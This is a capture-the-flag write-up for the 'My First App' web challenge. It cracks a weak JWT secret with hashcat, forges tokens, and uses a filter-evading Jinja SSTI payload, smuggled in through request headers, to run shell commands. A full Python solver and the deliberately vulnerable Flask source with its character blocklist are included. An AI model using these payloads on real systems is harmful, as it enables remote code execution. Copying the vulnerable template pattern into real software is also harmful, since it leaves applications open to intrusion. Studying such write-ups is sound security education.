# My First App [32 Solves]

## Description

> I'm not much of a web developer, so my friends advised me to pay for a very expensive firewall to keep my first app secure from pesky hackers. Come check it out!
>
> Author: SteakEnthusiast
>
> `https://uoftctf-my-first-app.chals.io/`

## Solution

### Explore functionality

![1.png](img/1.png)

Input `test`:

![2.png](img/2.png)

Input username is output like `Welcome, <input>`.

In this time, Set-Cookie response header is set:

![cookie.png](img/cookie.png)

> Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.3YrDfbJi4rasftYXJzUBoun4A2OMpD2Bu_vqb7LRlDc; Path=/

### Step1: JWT weak HMAC secret

```console
$ JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.3YrDfbJi4rasftYXJzUBoun4A2OMpD2Bu_vqb7LRlDc

$ python3 ~/tools/jwt_tool/jwt_tool.py $JWT

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] username = "test"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

$ hashcat -m 16500 $JWT /usr/share/wordlists/rockyou.txt --quiet
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.3YrDfbJi4rasftYXJzUBoun4A2OMpD2Bu_vqb7LRlDc:torontobluejays
```

JWT HMAC secret can be cracked and it is `torontobluejays`.
So we can rewrite username payload value.

### Step2: SSTI

```console
$ python3 ~/tools/jwt_tool/jwt_tool.py $JWT -I -pc username -pv '{{7*7}}' --sign hs256 -p torontobluejays

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:

jwttool_9fbf10b5ef29a9432f9c97ad6d94168f - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Int7Nyo3fX0ifQ.YgxJVPFH_IcLF9cW_GEEVEyhPQio_G6_n4ZiX7H0OjY
```

Set it to  auth_token cookie value and reload the page:

![ssti.png](img/ssti.png)

SSTI was detected.
However, there were significant restrictions on the available characters and words.
For example, `,[]"'_\/%` is not allowed.
This means that string such as `'__init__'` and `"__class__"` cannot be created.
Also, request query parameter is not allowed.
On the other hand, `request`, `origin` and `attr` are available so I came up with a payload to execute commands as follows:

- original SSTI payload: `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
- [`request.origin`](https://flask.palletsprojects.com/en/3.0.x/api/#flask.Request.origin) can be used
- `"headers"` string: request header `Origin: headers` and `request.origin` is the same as `"headers"` so `request|attr(request.origin)` is the same as `request.headers`.
- `"__init__"` string: request header `init: __init__` and `(request|attr(request.origin)).init` is the same as `request.headers.init`, then `"__init__"`.
- Do the same for other necessary strings.
- To generate `cycler.__init__`, payload is `cycler | attr((request|attr(request.origin)).init)`
- To retrieve a value in dict, not an object property, use the `__getitem__()` method.
  e.g. `os` module can be got by `cycler | attr((request|attr(request.origin)).init) | attr((request|attr(request.origin)).glob) | attr((request|attr(request.origin)).gi)((request|attr(request.origin)).o)`.

### Solver

```python
import requests
import jwt

import string

requests.packages.urllib3.disable_warnings()
s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
s.verify = False

BASE_URL = "https://uoftctf-my-first-app.chals.io"
SECRET = "torontobluejays"


def main():
    blockchars = """,[]"'_\/%"""
    blockwords = [
        "global",
        "os",
        "config",
        "headers",
        "args",
        "list",
        "cookies",
        "data",
        "files",
        "form",
        "json",
        "url",
        "items",
        "mro",
        "base",
        "builtins",
        "popen",
        "last",
        "join",
    ]

    # OK: environ, blueprint, method, server, init
    # Useful: origin, referer (referrer in Flask request)

    # payload = args.PAYLOAD if args.PAYLOAD else "{{7*7}}"
    # payload = string.ascii_letters + string.digits + string.punctuation  # check available char

    # (request|attr(request.origin)).<arg>
    # original: {{ cycler.__init__.__globals__.os.popen('id').read() }}
    payload = (
        "{{ cycler"
        + "| attr((request|attr(request.origin)).init)"
        + "| attr((request|attr(request.origin)).glob)"
        + "| attr((request|attr(request.origin)).gi)((request|attr(request.origin)).o)"
        + "| attr((request|attr(request.origin)).po)((request|attr(request.origin)).cmd)"
        + "| attr((request|attr(request.origin)).read)()"
        + "| safe"
        + "}}"
    )

    for x in list(blockchars) + blockwords:
        assert x not in payload, f"Expected: {x} is not in {payload}"

    encoded_jwt = jwt.encode({"username": payload}, SECRET, algorithm="HS256")
    s.cookies.update({"auth_token": encoded_jwt})

    r = s.get(
        f"{BASE_URL}/dashboard",
        headers={
            "cmd": "cat flag.txt",
            "Origin": "headers",
            "init": "__init__",
            "glob": "__globals__",
            "gi": "__getitem__",
            "o": "os",
            "po": "popen",
            "read": "read",
        },
    )
    print(r.text)


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py | grep -oE 'uoftctf{.*}'
uoftctf{That_firewall_salesperson_scammed_me_:(}
```

## Flag

uoftctf{That_firewall_salesperson_scammed_me_:(}

## Post Exploitation

I got the source code routes.py and found that many characters and words was restricted by `restricted_stuff`:

<details><summary>routes.py</summary>

```python
from flask import Blueprint, request, render_template, make_response, redirect, url_for, render_template_string
from utils import create_jwt, decode_jwt

web = Blueprint('web', __name__, template_folder='templates', static_folder='static')

@web.route('/')
def home():
    if request.cookies.get('auth_token'):
        return redirect(url_for('web.dashboard'))
    return redirect(url_for('web.register'))

@web.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        if not username.isalnum():
            return render_template('register.html', title="Register", error="Username must be alphanumeric.")
        token = create_jwt(username)
        response = make_response(redirect(url_for('web.dashboard')))
        response.set_cookie('auth_token', token)
        return response
    return render_template('register.html', title="Register")

@web.route('/dashboard')
def dashboard():
    if request.args:
        return "Whoa there bucko, did you forget I'm not a web developer? I don't know how to handle parameters yet!"
    
    token = request.cookies.get('auth_token')
    user_info = decode_jwt(token)
    print(user_info)
    if not user_info:
        return redirect(url_for('web.register'))
    
    if not str(user_info['username']).isascii():
        return f"It's not a pyjail XD. ASCII characters only please!"

    restricted_stuff = [',', '[', ']', '"', "'", '_', '\\','/','headers','url','path','data','json','args','cookies','files','form','flag', '%', 'os','system','popen','sys','module','mro','class','base','getitem','subprocess','application','config','list','dict','global','builtins','import','join','first','last','reverse','lower','upper','items','format']
    
    blocked = False
    
    found_strings = []
    
    for blacklisted in restricted_stuff:
        if blacklisted in str(user_info['username']):
            found_strings.append(blacklisted)
            blocked = True
    
    if blocked:
        title_text = "BLOCKED"
        content_html = f'''<div class="error-message">My very expensive firewall detected a malicious hacking attempt. Pls stop :(
        <br>Malicious stuff: {found_strings}</br>
        </div>'''
    else:
        title_text = f"Welcome, {user_info['username']}"
        content_html = "<p>This is my first app! I'm not much a web developer though, so there isn't much to do here, sorry!</p>"

    logout_form_html = '''
    <form action="{{ url_for('web.logout') }}" method="post">
        <input type="submit" value="Logout">
    </form>
    '''

    dashboard_template = f'''
    {{% extends "layout.html" %}}
    {{% block content %}}
    <div class="form-container">
    <h1 class="welcome-text">{title_text}</h1> 
    {content_html}
    {logout_form_html}
    </div>
    {{% endblock %}}
    '''
    return render_template_string(dashboard_template)



@web.route('/logout', methods=['POST'])
def logout():
    response = make_response(redirect(url_for('web.register')))
    response.set_cookie('auth_token', '', expires=0)
    return response
```

</details>

## References

- [API — Flask Documentation (3.0.x) | flask.Request](https://flask.palletsprojects.com/en/3.0.x/api/#flask.Request)
- [Template Designer Documentation — Jinja Documentation (3.1.x)](https://jinja.palletsprojects.com/en/3.1.x/templates/#jinja-filters.attr)
- [Server Side Template Injection - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#exploit-the-ssti-by-calling-ospopenread)
